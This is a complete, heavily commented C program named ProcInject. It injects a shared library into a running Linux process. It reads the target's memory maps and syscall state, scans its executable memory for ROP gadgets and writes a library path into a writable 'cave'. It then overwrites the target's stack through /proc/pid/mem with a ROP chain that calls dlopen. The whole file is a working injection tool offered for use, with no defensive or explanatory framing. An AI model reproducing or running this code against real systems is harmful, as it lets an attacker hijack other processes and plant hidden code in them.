#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <errno.h>

// Constants
#define PROC_MAPS "/proc/%d/maps"  // Path to the memory map of a process using its PID
#define PROC_MEM "/proc/%d/mem"    // Path to the memory of a process for reading/writing
#define PROC_SYSCALL "/proc/%d/syscall" // Path to access syscall information for a process
#define LIBC_PATH "/usr/lib/x86_64-linux-gnu/libc.so.6" // Path to the standard C library (libc) on the system
#define MAX_LINE 1024               // Maximum length of a line when reading files (e.g., maps)
#define MAX_MAPS 1024               // Maximum number of memory map entries to hold in memory

// Memory map entry structure
typedef struct {
    uint64_t start;  // Start address of the memory region
    uint64_t end;    // End address of the memory region
    char perms[5];   // Permissions of the memory region (e.g., read, write, execute)
    char name[256];  // Name of the mapped object or region
} MapEntry;

// Syscall info structure
typedef struct {
    uint64_t syscall_num;  // Number of the syscall being invoked
    uint64_t rdi;          // First argument to the syscall (stored in rdi)
    uint64_t rsi;          // Second argument to the syscall (stored in rsi)
    uint64_t rdx;          // Third argument to the syscall (stored in rdx)
    uint64_t r10;          // Fourth argument to the syscall (stored in r10)
    uint64_t r8;           // Fifth argument to the syscall (stored in r8)
    uint64_t r9;           // Sixth argument to the syscall (stored in r9)
    uint64_t rsp;          // Stack pointer at the time of the syscall (stored in rsp)
    uint64_t rip;          // Instruction pointer at the time of the syscall (stored in rip)
} SyscallInfo;

// Gadget structure
typedef struct {
    const char *name;        // Name of the gadget for identification
    unsigned char *bytes;    // Byte sequence representing the gadget's instructions
    size_t len;              // Length of the gadget in bytes
} Gadget;

// Exploit utils structure
typedef struct {
    int pid;                // Process ID of the target process
    MapEntry *memory_map;   // Pointer to an array of memory map entries for the process
    int map_count;          // Number of memory map entries populated
} ExploitUtils;

// Function prototypes
void init_exploit_utils(ExploitUtils *utils, int pid);    // Initializes the exploit utility structure for a given PID
void free_exploit_utils(ExploitUtils *utils);             // Frees resources allocated in the exploit utility structure
int parse_maps(ExploitUtils *utils);                      // Parses the memory maps of the target process into the utility structure
int parse_maps_entry(const char *line, MapEntry *entry);  // Parses a single line from the memory map into a MapEntry structure
uint64_t get_entry_size(MapEntry *entry);                 // Calculates the size of a memory map entry
ssize_t read_memory(int pid, uint64_t address, void *buffer, size_t size); // Reads memory from the target process at a specified address
ssize_t write_memory(int pid, uint64_t address, const void *buffer, size_t size); // Writes memory to the target process at a specified address
int64_t find_gadget(ExploitUtils *utils, const unsigned char *gadget, size_t gadget_len, const char *name); // Searches for a specific gadget in memory
int64_t find_cave(ExploitUtils *utils, size_t cave_size); // Finds a writable memory area (cave) in the target process
int parse_proc_syscall(int pid, SyscallInfo *info);       // Parses syscall information for the target process into a SyscallInfo structure
uint64_t find_libc_base(ExploitUtils *utils);             // Finds the base address of the libc in the target process's memory
uint64_t locate_dlopen(uint64_t libc_base);               // Locates the address of the dlopen function in libc based on its base address
void create_dlopen_rop(ExploitUtils *utils, uint64_t cave_addr, unsigned char *rop_chain, size_t *rop_size); // Constructs a ROP chain to call dlopen
void inject_so(int target_pid, const char *so_path);      // Injects a shared object into the target process

// Initialize exploit utils
void init_exploit_utils(ExploitUtils *utils, int pid) {
    utils->pid = pid;                                      // Set the target process ID in the utils structure
    utils->memory_map = malloc(sizeof(MapEntry) * MAX_MAPS); // Allocate memory for storing memory map entries
    utils->map_count = 0;                                  // Initialize the count of memory map entries to zero
    parse_maps(utils);                                     // Parse the memory maps of the target process and populate the structure
}

// Free exploit utils
void free_exploit_utils(ExploitUtils *utils) {
    if (utils->memory_map) {       // Check if the memory map has been allocated
        free(utils->memory_map);   // Free the allocated memory for the memory map
    }
}

// Parse /proc/pid/maps
int parse_maps(ExploitUtils *utils) {
    // Buffer to hold the path to the maps file
    char path[256];
    // Construct the full path using the target process PID
    snprintf(path, sizeof(path), PROC_MAPS, utils->pid);
    
    // Open the maps file for reading
    FILE *fp = fopen(path, "r");
    if (!fp) {
        printf("Failed to open maps file (%d: %s)\n", errno, strerror(errno));
        return -1;
    }
    
    // Buffer to hold each line read from the maps file
    char line[MAX_LINE];

    // Read each line until EOF or max entries reached
    while (fgets(line, sizeof(line), fp) && utils->map_count < MAX_MAPS) {
        // Parse line into MapEntry
        if (parse_maps_entry(line, &utils->memory_map[utils->map_count]) == 0) {
            utils->map_count++; // Increment the count of memory map entries
        }
    }
    
    fclose(fp);  // Close the maps file
    return 0;    // Return success
}

// Parse a single maps entry
int parse_maps_entry(const char *line, MapEntry *entry) {
    // Buffers to hold the start and end addresses as strings
    char start_str[32], end_str[32];
    // Buffer to hold the permissions of the memory region
    char perms[5];
    // Buffer to hold the name of the mapped region, initialized to an empty string
    char name[256] = "";
    
    // Parse the line into start, end, perms, and name
    int parsed = sscanf(line, "%[^-]-%s %s %*s %*s %*s %[^\n]", start_str, end_str, perms, name);
    if (parsed < 3) {
        return -1;
    }
    
    entry->start = strtoull(start_str, NULL, 16);   // Convert the start address from string to unsigned long long
    entry->end = strtoull(end_str, NULL, 16);       // Convert the end address from string to unsigned long long
    strncpy(entry->perms, perms, 5);                // Copy permissions into the entry structure
    strncpy(entry->name, name, 256);                // Copy the name into the entry structure
    
    return 0;
}

// Get size of memory map entry
uint64_t get_entry_size(MapEntry *entry) {
    return entry->end - entry->start; // Calculate and return the size of the memory map entry
}

// Read memory from target process
ssize_t read_memory(int pid, uint64_t address, void *buffer, size_t size) {
    char path[256];                                  // Buffer to hold the path to the process memory file
    
    // Construct the path using the target process PID
    snprintf(path, sizeof(path), PROC_MEM, pid);
    
    // Open the process memory file for reading
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        return -1;
    }
    
    // Seek to the specified address in the process memory
    if (lseek(fd, address, SEEK_SET) < 0) {
        close(fd);  // Close the file descriptor
        return -1;
    }
    
    // Read the specified number of bytes into the buffer
    ssize_t bytes_read = read(fd, buffer, size);
    
    close(fd);           // Close the file descriptor
    return bytes_read;   // Return the number of bytes read
}

// Write memory to target process
ssize_t write_memory(int pid, uint64_t address, const void *buffer, size_t size) {
    // Buffer to hold the path to the process memory file
    char path[256];
    // Construct the path using the target process PID
    snprintf(path, sizeof(path), PROC_MEM, pid);
    
    // Open the process memory file for writing
    int fd = open(path, O_WRONLY);
    if (fd < 0) { 
        return -1;
    }
    
    // Seek to the specified address in the process memory
    if (lseek(fd, address, SEEK_SET) < 0) {
        close(fd);   // Close the file descriptor
        return -1;
    }
    
    // Write the specified number of bytes from the buffer
    ssize_t bytes_written = write(fd, buffer, size);

    close(fd);              // Close the file descriptor
    return bytes_written;   // Return the number of bytes written
}

// Find gadget in memory
int64_t find_gadget(ExploitUtils *utils, const unsigned char *gadget, size_t gadget_len, const char *name) {
    // Iterate through each memory map entry
    for (int i = 0; i < utils->map_count; i++) {
        MapEntry *entry = &utils->memory_map[i]; // Get current memory map entry
        
        // Check if the memory region is executable
        if (strcmp(entry->perms, "r-xp") != 0) {
            continue; // Skip non-executable regions
        }
        
         // Get size of the memory region
        size_t map_size = get_entry_size(entry);
         // Allocate buffer for memory content
        unsigned char *buffer = malloc(map_size);
        if (!buffer) {
            continue; // Skip if memory allocation fails
        }
        
         // Read memory into buffer
        ssize_t bytes_read = read_memory(utils->pid, entry->start, buffer, map_size);
        if (bytes_read <= 0) {
            free(buffer); // Free buffer if read fails
            continue; // Skip to the next entry
        }
        
        // Search for the specified gadget in the buffer
        for (size_t offset = 0; offset < map_size - gadget_len; offset++) {
            // Compare the bytes in buffer with the gadget
            if (memcmp(&buffer[offset], gadget, gadget_len) == 0) {
                uint64_t gadget_addr = entry->start + offset; // Calculate gadget address
                printf("Found %s gadget at: 0x%lx\n", name, gadget_addr);
                free(buffer); // Free allocated buffer
                return gadget_addr;
            }
        }
        
        free(buffer); // Free buffer after searching
    }
    
    printf("Gadget %s not found\n", name);
    return -1;
}

// Find memory cave
int64_t find_cave(ExploitUtils *utils, size_t cave_size) {
    // Iterate through each memory map entry
    for (int i = 0; i < utils->map_count; i++) {
        MapEntry *entry = &utils->memory_map[i]; // Get current memory map entry
        
        // Check if the memory region is writable
        if (strcmp(entry->perms, "rw-p") != 0) {
            continue; // Skip non-writable regions
        }
        
        // Get size of the memory region
        size_t map_size = get_entry_size(entry);
        // Allocate buffer for memory content
        unsigned char *buffer = malloc(map_size);
        if (!buffer) {
            continue; // Skip if memory allocation fails
        }
        
        // Read memory into buffer
        ssize_t bytes_read = read_memory(utils->pid, entry->start, buffer, map_size);
        if (bytes_read <= 0) {
            free(buffer); // Free buffer if read fails
            continue; // Skip to next entry
        }
        
        // Search for a cave (all zeros)
        for (size_t offset = 0; offset <= map_size - cave_size; offset++) {
            // Assume the area is a cave
            int is_cave = 1;
            // Loop through each byte in the specified size
            for (size_t j = 0; j < cave_size; j++) {
                // Check if the current byte is non-zero
                if (buffer[offset + j] != 0) {
                    is_cave = 0; // Mark as not a cave if a non-zero byte is found
                    break;
                }
            }
            
            if (is_cave) {
                // Calculate cave address
                uint64_t cave_addr = entry->start + offset;
                printf("Found cave at 0x%lx\n", cave_addr);
                free(buffer); // Free allocated buffer
                return cave_addr;
            }
        }
        
        free(buffer); // Free buffer after searching
    }
    
    printf("Cave not found (%d: %s)\n", errno, strerror(errno));
    return -1;
}

// Parse /proc/pid/syscall
int parse_proc_syscall(int pid, SyscallInfo *info) {
    // Buffer to hold the path to the syscall file
    char path[256];
    // Construct the path using the target PID
    snprintf(path, sizeof(path), PROC_SYSCALL, pid);
    
    // Open the syscall file for reading
    FILE *fp = fopen(path, "r");
    if (!fp) {
        printf("Failed to open syscall file (%d: %s)\n", errno, strerror(errno));
        return -1;
    }
    
    // Read syscall information into the SyscallInfo structure
    int result = fscanf(fp, "%lx %lx %lx %lx %lx %lx %lx %lx %lx",
                       &info->syscall_num, &info->rdi, &info->rsi, &info->rdx,
                       &info->r10, &info->r8, &info->r9, &info->rsp, &info->rip);
    
    fclose(fp); // Close the file after reading
    
    // Check if all expected values were parsed
    if (result != 9) {
        printf("Failed to parse syscall info (%d: %s)\n", errno, strerror(errno));
        return -1;
    }
    
    return 0; // Return 0 for successful parsing
}

// Find libc base address
uint64_t find_libc_base(ExploitUtils *utils) {
    // Iterate through each memory map entry
    for (int i = 0; i < utils->map_count; i++) {
        // Get current memory map entry
        MapEntry *entry = &utils->memory_map[i];
        // Check if the entry corresponds to libc and has the correct permissions
        if (strstr(entry->name, "libc.so.6") && strcmp(entry->perms, "r--p") == 0) {
            return entry->start; // Return the start address of libc
        }
    }
    
    printf("Could not find libc base address (%d: %s)\n", errno, strerror(errno));
    return 0;
}

// Locate dlopen address
uint64_t locate_dlopen(uint64_t libc_base) {
    // Load libc dynamically
    void *handle = dlopen(LIBC_PATH, RTLD_LAZY);
    if (!handle) {
        printf("Failed to load libc (%d: %s)\n", errno, strerror(errno));
        return 0;
    }
    
    // Get the address of the dlopen function
    void *dlopen_ptr = dlsym(handle, "dlopen");
    if (!dlopen_ptr) {
        printf("Failed to find dlopen symbol (%d: %s)\n", errno, strerror(errno));
        dlclose(handle); // Close the handle to the loaded library
        return 0;
    }
    
    // Get information about the loaded library
    Dl_info info;
    // Retrieve address info for dlopen
    if (dladdr(dlopen_ptr, &info) == 0) {
        printf("Failed to get dlopen info (%d: %s)\n", errno, strerror(errno));
        dlclose(handle); // Close the handle to the loaded library
        return 0;
    }
    
    // Calculate the offset of dlopen from the base address of libc
    uint64_t dlopen_offset = (uint64_t)dlopen_ptr - (uint64_t)info.dli_fbase;
    // Calculate absolute address of dlopen
    uint64_t dlopen_addr = libc_base + dlopen_offset;
    
    printf("dlopen address: 0x%lx\n", dlopen_addr);
    
    dlclose(handle);    // Close the handle to the loaded library
    return dlopen_addr; // Return the absolute address of dlopen
}

// Create dlopen ROP chain
void create_dlopen_rop(ExploitUtils *utils, uint64_t cave_addr, unsigned char *rop_chain, size_t *rop_size) {
    // Define the necessary gadget instructions
    unsigned char nop_ret[] = {0x90, 0xc3}; // NOP and RET
    unsigned char jmp_rax[] = {0xff, 0xe0}; // Jump to address in RAX
    unsigned char pop_rsi[] = {0x5e, 0xc3}; // Pop into RSI
    unsigned char pop_rdi[] = {0x5f, 0xc3}; // Pop into RDI
    unsigned char pop_rax[] = {0x58, 0xc3}; // Pop into RAX
    
    // Find the necessary gadgets in memory
    int64_t nop_gadget = find_gadget(utils, nop_ret, 2, "nop");
    int64_t jmp_rax_gadget = find_gadget(utils, jmp_rax, 2, "jmp_rax");
    int64_t pop_rsi_gadget = find_gadget(utils, pop_rsi, 2, "pop_rsi");
    int64_t pop_rdi_gadget = find_gadget(utils, pop_rdi, 2, "pop_rdi");
    int64_t pop_rax_gadget = find_gadget(utils, pop_rax, 2, "pop_rax");
    
    // Check if all required gadgets were found
    if (nop_gadget == -1 || jmp_rax_gadget == -1 || pop_rsi_gadget == -1 ||
        pop_rdi_gadget == -1 || pop_rax_gadget == -1) {
        printf("Failed to find required gadgets (%d: %s)\n", errno, strerror(errno));
        *rop_size = 0; // Set ROP size to 0 on failure
        return;
    }
    
    // Get the base address of libc
    uint64_t libc_base = find_libc_base(utils);
    if (libc_base == 0) {
        *rop_size = 0; // Set ROP size to 0 on failure
        return;
    }
    
    // Get the address of dlopen
    uint64_t dlopen_addr = locate_dlopen(libc_base);
    if (dlopen_addr == 0) {
        *rop_size = 0; // Set ROP size to 0 on failure
        return;
    }
    
    // Build the ROP chain
    uint64_t *rop = (uint64_t *)rop_chain; // Cast rop_chain to a uint64_t pointer
    int idx = 0; // Initialize index for ROP chain
    
    rop[idx++] = nop_gadget;     // Add NOP gadget to the chain
    rop[idx++] = pop_rax_gadget; // Add POP RAX gadget to the chain
    rop[idx++] = dlopen_addr;    // Add address of dlopen to the chain
    rop[idx++] = pop_rdi_gadget; // Add POP RDI gadget to the chain
    rop[idx++] = cave_addr;      // Add address of the cave to the chain
    rop[idx++] = pop_rsi_gadget; // Add POP RSI gadget to the chain
    rop[idx++] = RTLD_LAZY;      // Add flags for dlopen to the chain
    rop[idx++] = jmp_rax_gadget; // Add JUMP to RAX gadget to the chain
    
    *rop_size = idx * sizeof(uint64_t); // Set the size of the ROP chain
}

// Main injection function
void inject_so(int target_pid, const char *so_path) {
    // Declare a structure to hold exploit utilities
    ExploitUtils utils;
    // Initialize the exploit utilities with the target PID
    init_exploit_utils(&utils, target_pid);
    
    // Parse syscall information from the target process
    SyscallInfo syscall_info;
    // Check for parsing errors
    if (parse_proc_syscall(target_pid, &syscall_info) != 0) {
        free_exploit_utils(&utils); // Free resources if parsing failed
        return;
    }
    
    printf("Current RSP: 0x%lx\n", syscall_info.rsp);
    
    // Find an appropriate memory cave for injection
    size_t so_path_len = strlen(so_path) + 1; // Calculate the length of the SO path
    int64_t cave_addr = find_cave(&utils, so_path_len); // Locate a writable memory cave
    if (cave_addr == -1) {
        free_exploit_utils(&utils); // Free resources if no cave was found
        return;
    }
    
    // Create the ROP chain for the injection
    unsigned char rop_chain[1024]; // Allocate buffer for the ROP chain
    size_t rop_size; // Variable to hold the size of the ROP chain
    create_dlopen_rop(&utils, cave_addr, rop_chain, &rop_size); // Generate the ROP chain
    
    if (rop_size == 0) { // Check if ROP chain creation failed
        printf("Failed to create ROP chain (%d: %s)\n", errno, strerror(errno));
        free_exploit_utils(&utils); // Free resources
        return;
    }
    
    // Write the SO path into the memory cave
    if (write_memory(target_pid, cave_addr, so_path, so_path_len) < 0) {
        printf("Failed to write SO path to memory (%d: %s)\n", errno, strerror(errno));
        free_exploit_utils(&utils); // Free resources
        return;
    }
    
    printf("Wrote SO path to memory cave\n");
    
    // Write the ROP chain to the stack of the target process
    if (write_memory(target_pid, syscall_info.rsp, rop_chain, rop_size) < 0) {
        printf("Failed to write ROP chain to stack (%d: %s)\n", errno, strerror(errno));
        free_exploit_utils(&utils); // Free resources
        return;
    }
    
    printf("Injection complete\n");

    // Free resources before exiting
    free_exploit_utils(&utils);
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: ProcInject <target_pid> <so_path>\n");
        return 1;
    }
    
    int target_pid = atoi(argv[1]); // Convert target PID from string to integer
    const char *so_path = argv[2];  // Get the path to the shared object
    
    printf("[*] Target PID: %d\n", target_pid);
    printf("[*] SO path: %s\n", so_path);
    
    // Call the function to inject the SO into the target process
    inject_so(target_pid, so_path);
    
    return 0;
}